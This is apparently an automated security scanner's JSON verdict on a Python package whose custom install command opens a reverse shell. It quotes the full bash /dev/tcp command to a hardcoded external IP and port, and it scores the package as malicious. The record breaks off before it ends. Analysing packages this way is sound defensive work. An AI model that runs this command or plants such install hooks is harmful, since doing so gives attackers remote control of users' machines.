{
  "purpose": "The code executes a reverse shell during package installation, establishing a remote connection to an external IP, which is malicious behavior.",
  "sources": "The os.system call executing 'bash -c \"bash -i >& /dev/tcp/114.116.119.253/7777 <&1\"' during the run method of CustomInstallCommand.",
  "sinks": "The reverse shell command connects to an external IP, providing remote control over the host system.",
  "flows": "Post-installation, the code runs os.system with the reverse shell command, establishing an outbound TCP connection to the specified IP and port.",
  "anomalies": "The hardcoded IP address and port in the reverse shell command; explicit execution of malicious reverse shell code during installation.",
  "analysis": "The code defines a custom install command that, after standard installation, executes a reverse shell via os.system. This establishes a remote connection, allowing control over the host system. The malicious command is explicit, with no obfuscation, and the IP and port are hardcoded, indicating deliberate malicious intent. The behavior is clearly malicious, with high confidence, and the activity poses a severe security risk.",
  "conclusion": "The code contains a clear malicious backdoor in the form of a reverse shell executed during package installation. The malware score is 1, obfuscation is 0, and security risk is 1, reflecting the high severity of this security threat.",
  "confidence": 1,
  "obfuscated": 0,
